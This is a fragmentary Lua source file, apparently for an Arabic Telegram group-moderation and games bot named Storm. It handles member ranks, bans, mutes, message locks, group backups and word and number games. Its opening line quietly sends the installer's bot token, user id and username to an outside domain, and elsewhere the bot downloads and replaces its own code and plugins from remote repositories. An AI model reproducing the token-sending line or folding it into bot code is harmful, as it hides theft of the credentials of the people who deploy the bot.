...
https.request("https://teamstorm.tk/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_DevStorm.."Token_DevStorm"))
else
...
elseif redis:sismember(bot_id.."Storm:President:Group"..chat_id, user_id) then
Status = redis:get(bot_id.."Storm:President:Group:Reply"..chat_id) or "المنشئ اساسي"
elseif redis:sismember(bot_id..'Storm:Constructor:Group'..chat_id, user_id) then
...
Status = redis:get(bot_id.."Storm:Mempar:Group:Reply"..chat_id) or "العضو"
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
...
local Get_Info = io.open('./'..bot_id..'Storm:.json', "r"):read('*a')
local JsonInfo = JSON.decode(Get_Info)
var(JsonInfo)  
for Id_Group,Info_Group in pairs(JsonInfo.Groups) do
redis:set(bot_id.."Storm:Lock:tagservrbot"..Id_Group,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,v in pairs(list) do
redis:set(bot_id..v..Id_Group,"del")
end
redis:sadd(bot_id.."Storm:ChekBotAdd",Id_Group)
if Info_Group.President then
for k,Id_President in pairs(Info_Group.President) do
redis:sadd(bot_id.."Storm:President:Group"..Id_Group,Id_President)
end
end
if Info_Group.Constructor then
for k,Id_Constructor in pairs(Info_Group.Constructor) do
redis:sadd(bot_id.."Storm:Constructor:Group"..Id_Group,Id_Constructor)  
end
end
if Info_Group.Manager then
for k,Id_Manager in pairs(Info_Group.Manager) do
redis:sadd(bot_id.."Storm:Manager:Group"..Id_Group,Id_Manager)  
end
end
if Info_Group.Admin then
for k,Id_Admin in pairs(Info_Group.Admin) do
redis:sadd(bot_id.."Storm:Admin:Group"..Id_Group,Id_Admin)  
end
end
if Info_Group.Vips then
for k,Id_Vips in pairs(Info_Group.Vips) do
redis:sadd(bot_id.."Storm:Vip:Group"..Id_Group,Id_Vips)  
end
end
if Info_Group.WelcomeGroup then
if Info_Group.WelcomeGroup ~= "" then
redis:set(bot_id.."Storm:Get:Welcome:Group"..Id_Group,Info_Group.WelcomeGroup)   
end
end
if Info_Group.Status_Dev then
if Info_Group.Status_Dev ~= "" then
redis:set(bot_id.."Storm:Developer:Bot:Reply"..Id_Group,Info_Group.Status_Dev)   
end
end
if Info_Group.Status_Prt then
if Info_Group.Status_Prt ~= "" then
redis:set(bot_id.."Storm:President:Group:Reply"..Id_Group,Info_Group.Status_Prt)   
end
end
if Info_Group.Status_Cto then
if Info_Group.Status_Cto ~= "" then
redis:set(bot_id.."Storm:Constructor:Group:Reply"..Id_Group,Info_Group.Status_Cto)   
end
end
if Info_Group.Status_Own then
if Info_Group.Status_Own ~= "" then
redis:set(bot_id.."Storm:Manager:Group:Reply"..Id_Group,Info_Group.Status_Own)   
end
end
if Info_Group.Status_Md then
if Info_Group.Status_Md ~= "" then
redis:set(bot_id.."Storm:Admin:Group:Reply"..Id_Group,Info_Group.Status_Md)   
end
end
if Info_Group.Status_Vip then
if Info_Group.Status_Vip ~= "" then
redis:set(bot_id.."Storm:Vip:Group:Reply"..Id_Group,Info_Group.Status_Vip)   
end
end
if Info_Group.Status_Mem then
if Info_Group.Status_Mem ~= "" then
redis:set(bot_id.."Storm:Mempar:Group:Reply"..Id_Group,Info_Group.Status_Mem)   
end
end
if Info_Group.LinkGroup then
if Info_Group.LinkGroup ~= "" then
redis:set(bot_id.."Storm:link:set:Group"..Id_Group,Info_Group.LinkGroup)   
end
end
end
...
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm:Random:Sm"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Storm:Set:Sma"..msg.chat_id_) then
if not redis:get(bot_id.."Storm:Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - سمايل او سمايلات")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Set:Sma"..msg.chat_id_,true)
return false
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm:Klam:Speed"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Storm:Speed:Tr"..msg.chat_id_) then
if not redis:get(bot_id.."Storm:Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - الاسرع او ترتيب")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Speed:Tr"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm:Klam:Hzor"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Storm:Set:Hzora"..msg.chat_id_) then
if not redis:get(bot_id.."Storm:Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - حزوره")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Set:Hzora"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm:Maany"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Storm:Set:Maany"..msg.chat_id_) then
if not redis:get(bot_id.."Storm:Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - معاني")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Set:Maany"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm:Set:Aks:Game"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Storm:Set:Aks"..msg.chat_id_) then
if not redis:get(bot_id.."Storm:Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - العكس")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Set:Aks"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Storm:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"📬┇عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
local GETNUM = redis:get(bot_id.."Storm:GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."Storm:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."Storm:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,"🔖┇مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸┇تم اضافة { 5 } من النقاط \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby(bot_id.."Storm:SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(redis:get(bot_id.."Storm:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
redis:del(bot_id.."Storm:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."Storm:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
...
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Storm:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"📬┇عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false  end 
local GETNUM = redis:get(bot_id.."Storm:Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."Storm:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"📮┇مبروك فزت وطلعت المحيبس بل ايد رقم { "..NUM.." }\n🎊┇لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل ")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:del(bot_id.."Storm:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
...
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm::Set:Moktlf"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Storm:Set:Moktlf:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Storm::Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - المختلف")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Set:Moktlf:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Storm:Set:Amth"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Storm:Set:Amth:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Storm:Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n🎉┇لقد فزت في اللعبه \n📬┇اللعب مره اخره وارسل - امثله")
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Storm:Set:Amth:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
...
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'Storm:GetTexting:DevStorm'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' or text == 'الغاء ✖' then 
redis:del(bot_id..'Storm:GetTexting:DevStorm'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'〽┇تم الغاء حفظ كليشة المطور')
return false
end
redis:set(bot_id..'Storm:Texting:DevStorm',text)
redis:del(bot_id..'Storm:GetTexting:DevStorm'..msg.chat_id_..':'..msg.sender_user_id_)
...
send(msg.chat_id_, msg.id_, Text)
redis:sadd(bot_id.."Storm:Spam_For_Bot"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
...
download_to_file('https://raw.githubusercontent.com/blue371/Storm/master/Storm.lua','Storm.lua') 
--download_to_file('https://raw.githubusercontent.com/blue371/Storm/master/Script.lua','Script.lua') 
...
local Get_Json, Res = https.request("https://raw.githubusercontent.com/blue371/StormFile/master/plugins_/"..File_Name)
if Res == 200 then
...
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Storm:Num:Add:Bot') or 0) and not Dev_Storm(msg) then
...
redis:sadd(bot_id..'Storm:ChekBotAdd',msg.chat_id_)
...
redis:sadd(bot_id..'Storm:ChekBotAdd',msg.chat_id_)  
redis:sadd(bot_id..'Storm:President:Group'..msg.chat_id_, msg.sender_user_id_)
...
CmdStart = '\n🙋┇أهلآ بك في بوت '..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر")..''..
...
if not Dev_Storm(msg) and not redis:sismember(bot_id..'Storm:User:Ban:Pv',msg.sender_user_id_) and not redis:get(bot_id..'Storm:Lock:Twasl') then
...
redis:setex(bot_id.."Storm:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"🔘┇ارسل لي المنشور الان\n〽┇يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠┇لالغاء الاذاعه ارسل : الغاء") 
return false
...
redis:del(bot_id..'Storm:Texting:DevStorm')
...
for k,v in pairs(list) do
local username = redis:get(bot_id.."Storm:Save:Username" .. v)
if username then
...
redis:set(bot_id..'Storm:Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
...
local Groups = redis:smembers(bot_id..'Storm:ChekBotAdd')  
local Get_Json = '{"IdBot": '..bot_id..'Storm:,"Groups":{'  
for k,v in pairs(Groups) do   
local President = redis:smembers(bot_id.."Storm:President:Group"..v)
local Constructor = redis:smembers(bot_id.."Storm:Constructor:Group"..v)
local Manager = redis:smembers(bot_id.."Storm:Manager:Group"..v)
...
local Status_Own = redis:get(bot_id.."Storm:Manager:Group:Reply"..v) 
local Status_Md = redis:get(bot_id.."Storm:Admin:Group:Reply"..v) 
local Status_Vip = redis:get(bot_id.."Storm:Vip:Group:Reply"..v) 
local Status_Mem = redis:get(bot_id.."Storm:Mempar:Group:Reply"..v) 
if k == 1 then
Get_Json = Get_Json..'"'..v..'":{'
else
Get_Json = Get_Json..',"'..v..'":{'
...
if TypeForChat == ("ForSuppur") then
if text ==  ""..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر")..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id.."Storm:Fun:Bots"..msg.chat_id_) then     
...
return false
elseif text == ""..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر")..' شنو رئيك بهاي' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id.."Storm:Fun:Bots"..msg.chat_id_) then    
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(Arg, Data) 
...
local list = redis:smembers(bot_id.."Storm:Vip:Group"..msg.chat_id_)
...
if not Constructor(msg) and redis:get(bot_id.."Storm:Cheking:Seted"..msg.chat_id_) then 
...
if not Constructor(msg) and redis:get(bot_id.."Storm:Lock:Ban:Group"..msg.chat_id_) then 
...
if redis:sismember(bot_id.."Storm:Validitys:Group"..msg.chat_id_,text:match("رفع (.*)")) then
function Status_reply(extra, result, success)   
local statusrt = redis:get(bot_id.."Storm:Add:Validity:Group:Rt"..text:match("رفع (.*)")..msg.chat_id_)
...
if redis:sismember(bot_id.."Storm:Validitys:Group"..msg.chat_id_,text:match("تنزيل (.*)")) then
function Status_reply(extra, result, success)   
local statusrt = redis:get(bot_id.."Storm:Add:Validity:Group:Rt"..text:match("تنزيل (.*)")..msg.chat_id_)
if statusrt == "مميز" and Admin(msg) then
redis:srem(bot_id.."Storm:Vip:Group"..msg.chat_id_,result.sender_user_id_)  
redis:del(bot_id.."Storm:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_)
elseif statusrt == "ادمن" and Owner(msg) then 
redis:srem(bot_id.."Storm:Admin:Group"..msg.chat_id_,result.sender_user_id_) 
redis:del(bot_id.."Storm:Add:Validity:Users"..msg.chat_id_..result.sender_user_id_)
elseif statusrt == "مدير" and Constructor(msg) then
...
if redis:sismember(bot_id.."Storm:Validitys:Group"..msg.chat_id_,text1[2]) then
function status_username(extra, result, success)   
if (result.id_) then
local statusrt = redis:get(bot_id.."Storm:Add:Validity:Group:Rt"..text1[2]..msg.chat_id_)
if statusrt == "مميز" and Admin(msg) then
redis:sadd(bot_id.."Storm:Vip:Group"..msg.chat_id_,result.id_)  
redis:set(bot_id.."Storm:Add:Validity:Users"..msg.chat_id_..result.id_,text1[2])
elseif statusrt == "ادمن" and Owner(msg) then 
redis:sadd(bot_id.."Storm:Admin:Group"..msg.chat_id_,result.id_)  
redis:set(bot_id.."Storm:Add:Validity:Users"..msg.chat_id_..result.id_,text1[2])
elseif statusrt == "مدير" and Constructor(msg) then
...
if statusrt == "مميز" and Admin(msg) then
redis:srem(bot_id.."Storm:Vip:Group"..msg.chat_id_,result.id_)  
redis:del(bot_id.."Storm:Add:Validity:Users"..msg.chat_id_..result.id_)
elseif statusrt == "ادمن" and Owner(msg) then 
redis:srem(bot_id.."Storm:Admin:Group"..msg.chat_id_,result.id_)  
redis:del(bot_id.."Storm:Add:Validity:Users"..msg.chat_id_..result.id_)
elseif statusrt == "مدير" and Constructor(msg) then 
...
redis:srem(bot_id.."Storm:Removal:User:Groups", text:match("^الغاء العام (%d+)$"))
...
redis:sadd(bot_id.."Storm:Removal:User:Group"..msg.chat_id_, text:match("^حظر (%d+)$") )
...
redis:srem(bot_id.."Storm:Removal:User:Group"..msg.chat_id_, text:match("^الغاء حظر (%d+)$") )
...
redis:sadd(bot_id.."Storm:Silence:User:Group"..msg.chat_id_, text:match("^كتم (%d+)$"))
...
redis:srem(bot_id.."Storm:Silence:User:Group"..msg.chat_id_,text:match("^الغاء كتم (%d+)$") )
...
redis:set(bot_id.."Storm:Fun:Group"..msg.chat_id_,"true")
elseif text == "تفعيل اوامر التحشيش" and Owner(msg) then    
send(msg.chat_id_, msg.id_,'☑┇تم تفعيل اوامر التحشيش')
redis:del(bot_id.."Storm:Fun:Group"..msg.chat_id_)
...
redis:del(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"☑┇تم تعطيل الالعاب") 
elseif text == "تفعيل الالعاب" and Owner(msg) then  
redis:set(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_,true) 
...
elseif text == (redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر") then
local namebot = {
"عمر "..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر").. " شتريد؟",
"أჂ̤ أჂ̤ هياتني اني",
"موجود بس لتصيح",
"لتــلح دا احجي ويه بنات سكر بعدين اجاوبك",
"راح نموت بكورونا ونته بعدك تصيح "..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر"),
'يمعود والله نعسان'
}
...
print('&&&')
local BotName = {
"باوع لك خليني احبك وصيحلي باسمي "..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر").. "",
"لتخليني ارجع لحركاتي لقديمه وردا ترا اسمي "..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر").. "",
...
if redis:get(bot_id.."Storm:Broadcasting:Bot") and not Dev_Storm(msg) then 
...
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) == 0 and not redis:get(bot_id..'Storm:Lock:Id:Photo'..msg.chat_id_) then
...
local Get_Is_Id = redis:get(bot_id.."Storm:Set:Id:Group"..msg.chat_id_)
if not redis:get(bot_id..'Storm:Lock:Id:Py:Photo'..msg.chat_id_) then
...
elseif text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 and not redis:get(bot_id..'Storm:Lock:Id:Photo'..msg.chat_id_) then
function Function_Status(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
return false
elseif text and text:match("^ايدي @(.*)$") and not redis:get(bot_id..'Storm:Lock:Id:Photo'..msg.chat_id_) then
...
redis:del(bot_id.."Storm:Set:Sma"..msg.chat_id_)
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","??","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","📌","📍","📓","📗","📂","📅","📪","📫","📬","📭","⏰","📺","🎚","☎️","📡"}
SM = Random[math.random(#Random)]
redis:set(bot_id.."Storm:Random:Sm"..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يدز هاذا السمايل ? ~ {`"..SM.."`}")
return false
end
elseif text == "الاسرع" or tect == "ترتيب" then
if redis:get(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Storm:Speed:Tr"..msg.chat_id_)
KlamSpeed = {"سحور","سياره","استقبال","قنفه","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","كهوه","سفينه","العراق","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","بتيته","لهانه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنيت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
redis:set(bot_id.."Storm:Klam:Speed"..msg.chat_id_,name)
...
if redis:get(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Storm:Set:Hzora"..msg.chat_id_)
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
name = Hzora[math.random(#Hzora)]
redis:set(bot_id.."Storm:Klam:Hzor"..msg.chat_id_,name)
...
if redis:get(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Storm:Set:Maany"..msg.chat_id_)
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
redis:set(bot_id.."Storm:Maany"..msg.chat_id_,name)
...
if redis:get(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Storm:Set:Aks"..msg.chat_id_)
katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
name = katu[math.random(#katu)]
redis:set(bot_id.."Storm:Set:Aks:Game"..msg.chat_id_,name)
...
redis:set(bot_id.."Storm:GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,"\n📛┇اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."💢┇ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."🔖┇سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ")
redis:setex(bot_id.."Storm:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
elseif text == "محيبس" or text == "بات" then
if redis:get(bot_id.."Storm:Lock:Game:Group"..msg.chat_id_) then   
Num = math.random(1,6)
redis:set(bot_id.."Storm:Games:Bat"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,[[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊
...
redis:setex(bot_id.."Storm:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
...
redis:del(bot_id.."Storm:Set:Moktlf:Bot"..msg.chat_id_)
redis:set(bot_id.."Storm::Set:Moktlf"..msg.chat_id_,name)
...
redis:set(bot_id.."Storm:Set:Amth"..msg.chat_id_,name)
redis:del(bot_id.."Storm:Set:Amth:Bot"..msg.chat_id_)
...
return false 
elseif tonumber(redis:get(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
...
redis:set(bot_id.."Storm:id:user"..msg.chat_id_,taha)  
...
redis:set(bot_id.."Storm:idgem:user"..msg.chat_id_,taha)  
...
redis:incrby(bot_id.."Storm:Num:Add:Games"..msg.chat_id_..result.sender_user_id_,text:match("^اضف مجوهرات (%d+)$"))  
...
local TextingDevStorm = redis:get(bot_id..'Storm:Texting:DevStorm')
...
redis:set(bot_id..'Storm:Save:Username'..msg.sender_user_id_,data.username_)
end;end,nil)   
--------------------------------------------------------------------------------------------------------------
...
if text and text:match('^'..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(redis:get(bot_id.."Storm:Redis:Name:Bot") or "سكر")..' ','')
end
if text then
...
local Get_Msg_Pin = redis:get(bot_id..'Storm:Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;redis:del(bot_id..'Storm:Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Storm:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
